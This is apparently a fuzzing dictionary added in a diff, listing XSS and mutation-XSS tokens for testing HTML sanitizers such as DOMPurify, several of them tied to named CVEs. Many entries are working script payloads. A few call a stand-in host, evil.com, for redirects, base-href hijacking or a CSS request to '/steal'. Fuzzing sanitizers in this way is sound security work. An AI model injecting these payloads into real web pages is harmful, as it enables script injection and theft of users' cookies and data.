@@ -1,0 +1,373 @@
+# =============================================================================
+# XSS Sanitizer Bypass Dictionary
+# For use with DictionaryMutator: --dict-file targets/xss_dictionary.txt
+# =============================================================================
+
+# --- Script tags and variations ---
+"<script>"
+"</script>"
+"<script/>"
+"<script "
+"<ScRiPt>"
+"<scr\x00ipt>"
+"<script\x09>"
+"<script\x0a>"
+"<script\x0d>"
+"<script\x0c>"
+"<script\x2f>"
+
+# --- Event handlers (case variations) ---
+"onerror="
+"onload="
+"onclick="
+"onfocus="
+"onmouseover="
+"onanimationstart="
+"ontoggle="
+"onbeforeinput="
+"onpointerenter="
+"ONERROR="
+"OnErRoR="
+"onerror ="
+" onerror="
+"/onerror="
+
+# --- javascript: URI variations ---
+"javascript:"
+"javascript :"
+"java\x09script:"
+"java\x0ascript:"
+"java\x0dscript:"
+"jAvAsCrIpT:"
+"&#x6A;avascript:"
+"&#106;avascript:"
+"&#74;avascript:"
+"\x6Aavascript:"
+"javascript&colon;"
+
+# --- data: URI variations ---
+"data:text/html,"
+"data:text/html;base64,"
+"data:text/html;charset=utf-8,"
+"data:image/svg+xml,"
+
+# --- vbscript: ---
+"vbscript:"
+
+# --- SVG XSS vectors ---
+"<svg>"
+"</svg>"
+"<svg/onload="
+"<svg onload="
+"<svg/onload=alert(1)>"
+"<svg><script>"
+"<svg><animate onbegin="
+"<svg><set onbegin="
+"<svg><use href="
+
+# --- MathML XSS vectors ---
+"<math>"
+"</math>"
+"<math><mtext>"
+"<math><annotation encoding=\"text/html\">"
+"</annotation></math>"
+"<math><mi><mglyph>"
+
+# --- Namespace confusion / mXSS ---
+"<svg><desc><table><thead><tr><td><svg onload=alert(1)>"
+"<math><mtext><table><mglyph><style>"
+"<svg><foreignObject>"
+"<foreignObject>"
+"</foreignObject>"
+"xmlns=\"http://www.w3.org/1999/xhtml\""
+"xmlns=\"http://www.w3.org/2000/svg\""
+"xmlns=\"http://www.w3.org/1998/Math/MathML\""
+
+# --- Dangerous elements ---
+"<iframe>"
+"<iframe src="
+"<iframe srcdoc="
+"<object data="
+"<embed src="
+"<applet>"
+"<base href="
+"<link rel=\"import\" href="
+"<meta http-equiv=\"refresh\""
+
+# --- Form-based XSS ---
+"<form action=\"javascript:"
+"<input onfocus="
+"<input autofocus onfocus="
+"<button formaction=\"javascript:"
+"<textarea onfocus="
+"<select onchange="
+
+# --- CSS expression ---
+"expression("
+"-moz-binding:"
+"@import"
+"behavior:"
+"url(javascript:"
+
+# --- Attribute breaking ---
+"\">"
+"'>"
+"\"/>"
+"\"onload=\""
+"' onload='"
+"\" onfocus=\""
+"\"autofocus onfocus=\""
+"\"<"
+"'<"
+
+# --- Comment tricks ---
+"<!--"
+"-->"
+"<!--><"
+"--!>"
+
+# --- Encoding tricks ---
+"&#x3C;"
+"&#60;"
+"&#x3E;"
+"&#62;"
+"&#x22;"
+"&#34;"
+"&#x27;"
+"&#39;"
+"&#x2F;"
+"&#47;"
+"&#x3c;script&#x3e;"
+"&#x0000006A;"
+
+# --- Null byte and whitespace injection ---
+"\x00"
+"\x09"
+"\x0a"
+"\x0d"
+"\x0c"
+"\x20"
+"\xa0"
+
+# --- Template/SSTI markers ---
+"{{7*7}}"
+"${7*7}"
+"<%=7*7%>"
+
+# --- Tag name confusion ---
+"<img "
+"<img/"
+"<img\t"
+"<video>"
+"<audio>"
+"<source>"
+"<details open ontoggle="
+"<marquee onstart="
+"<body onload="
+"<isindex action=\"javascript:"
+
+# --- Mutation XSS (mXSS) patterns ---
+"<noscript><img src=x onerror=alert(1)></noscript>"
+"<title><img src=x onerror=alert(1)></title>"
+"<textarea><img src=x onerror=alert(1)></textarea>"
+"<style><img src=x onerror=alert(1)></style>"
+"<xmp><img src=x onerror=alert(1)></xmp>"
+"<listing><img src=x onerror=alert(1)></listing>"
+"<plaintext>"
+"<noembed><img src=x onerror=alert(1)></noembed>"
+
+# --- §1 Namespace Switching (mXSS Taxonomy) ---
+"<svg><desc><body>"
+"<svg><title><body>"
+"<svg><foreignObject><body>"
+"<math><mi><table>"
+"<math><mo><table>"
+"<math><mn><table>"
+"<math><ms><table>"
+"<math><mtext><table>"
+"<math><annotation-xml encoding=\"text/html\">"
+"<math><annotation-xml encoding=\"application/xhtml+xml\">"
+"<svg><desc><table><thead><tr><td>"
+"<math><mtext><table><mglyph>"
+"<math><mtext><table><malignmark>"
+"<svg><desc><template>"
+"<math><mi><select>"
+
+# --- §2 Element Rearrangement ---
+"<table><caption><svg><desc>"
+"<table><thead><tr><td><svg>"
+"<p><b><p><svg>"
+"<table><tr><div>"
+"<table><style>"
+"<select><svg>"
+"<table><template>"
+
+# --- §3 RAWTEXT/RCDATA Confusion ---
+"<svg><style>"
+"<svg><style><![CDATA["
+"]]></style>"
+"<math><style>"
+"<svg><title>"
+"<svg><desc>"
+"<svg><style><!--"
+"--></style>"
+"<svg><style><![CDATA[]]><!--</style>"
+"<xmp></xmp>"
+
+# --- §4 Extended Encoding Tricks ---
+"&#x0000003C;"
+"&#0000060;"
+"&#x0000006A;avascript:"
+"&#0000106;avascript:"
+"\u006Aavascript:"
+
+# --- §5 Nesting Depth Exploitation ---
+"<div><div><div><div><div><div><div><div><div><div>"
+"</div></div></div></div></div></div></div></div></div></div>"
+"<form><div><div><div><div><div><div><div><div><div><div><svg>"
+
+# --- §6 Parser Algorithm Differentials ---
+"<image src=x onerror=alert(1)>"
+"<svg><image href=x>"
+"<a><table><a href=javascript:alert(1)>"
+"<select><template><img src=x onerror=alert(1)></template></select>"
+"<template><svg><desc><body><img src=x onerror=alert(1)>"
+"<form><button formaction=javascript:alert(1)>"
+
+# --- §7 Desanitization Chains ---
+"<svg><foreignObject><math><mtext>"
+"<math><mtext><svg><foreignObject>"
+"<svg><desc><math><mi><table><mglyph><style>"
+
+# --- §8 Configuration/API Misuse ---
+"<base href=\"javascript:void(0)\">"
+"<a href=\"javascript:alert(1)\">"
+"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
+
+# =============================================================================
+# DOMPurify Bypass Taxonomy Tokens (§1–§7)
+# =============================================================================
+
+# --- §1-1 MathML mglyph/malignmark namespace flip (CVE-2020-26870) ---
+"<math><mtext><mglyph>"
+"<math><mtext><malignmark>"
+"<math><mi><mglyph>"
+"<math><mo><malignmark>"
+"<mglyph>"
+"<malignmark>"
+"</mglyph>"
+"</malignmark>"
+
+# --- §1-2 SVG style breakout ---
+"<svg><style><a id=\""
+"\"></a></style></svg>"
+"</style><img src=x onerror=alert(1)>"
+"<svg><desc><style>"
+"<svg><title><style>"
+"<svg><image>"
+
+# --- §1-3 Comment-based namespace smuggling (CVE-2025-26791) ---
+"<!"
+"<!>"
+"<!-->"
+"<! "
+"<!--</style>"
+"--></style>"
+
+# --- §2-1 Depth flattening (CVE-2024-47875) ---
+"<table><caption>"
+"</caption></table>"
+"<table><caption><svg><title>"
+"<table><caption></caption></table>"
+
+# --- §2-2 Elevator mutation elements ---
+"<button>"
+"</button>"
+"<dd>"
+"</dd>"
+"<dt>"
+"</dt>"
+"<li>"
+"</li>"
+"<svg><image><a><desc>"
+
+# --- §2-3 Triple-parse form reordering ---
+"<form><h1></form><table><form></form></table></form></table></h1></form>"
+"<form></form><table><form></form></table>"
+"<marquee>"
+"<applet>"
+"<object>"
+
+# --- §3-1 DOM clobbering property names ---
+"<input name=\"parentNode\">"
+"<input name=\"__depth\">"
+"<input name=\"remove\">"
+"<input name=\"__removalCount\">"
+"<input name=\"nodeName\">"
+"<input name=\"nodeType\">"
+
+# --- §3-2 Prototype pollution ---
+"__proto__"
+"constructor"
+"prototype"
+"__depth"
+"__removalCount"
+
+# --- §4-1 Template literal regex bypass ---
+"${"
+"${ "
+"<%= "
+"{{ "
+" %>"
+" }}"
+
+# --- §4-3 SVG xmlns prefix injection ---
+"xmlns:data-x=\"http://www.w3.org/1999/xlink\""
+"data-x:href=\"javascript:alert(1)\""
+"xmlns:data-a=\"http://www.w3.org/1999/xlink\""
+
+# --- §5-1 Custom element confusion ---
+"<annotation-xml>"
+"</annotation-xml>"
+"<foo-bar>"
+"</foo-bar>"
+"<foo-test>"
+"</foo-test>"
+
+# --- §5-3 Hook exploitation ---
+"forceKeepAttr"
+"forceRemove"
+"is=\""
+
+# --- §5-4 XHTML Processing Instructions ---
+"<?img src=x onerror=alert(1)?>"
+"<?svg onload=alert(1)?>"
+"<![CDATA["
+"]]>"
+"<![CDATA[><img src=x onerror=alert(1)>"
+
+# --- §6-1 Serialize-parse roundtrip ---
+"<noscript><style></noscript>"
+"<noembed>"
+"</noembed>"
+"<noframes>"
+"</noframes>"
+
+# --- §7-1 Post-sanitization gadgets ---
+"@import url(\"https://evil.com/\")"
+"<base href=\"https://evil.com/\">"
+"<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com/\">"
+"<form action=\"/api/delete\" method=\"POST\">"
+"<style>body{background:url(https://evil.com/steal)}</style>"
+
+# --- Payload markers ---
+"alert(1)"
+"alert(document.domain)"
+"alert(document.cookie)"
+"confirm(1)"
+"prompt(1)"
+"eval("
+"Function("
+"constructor["
+"import("
+"top["
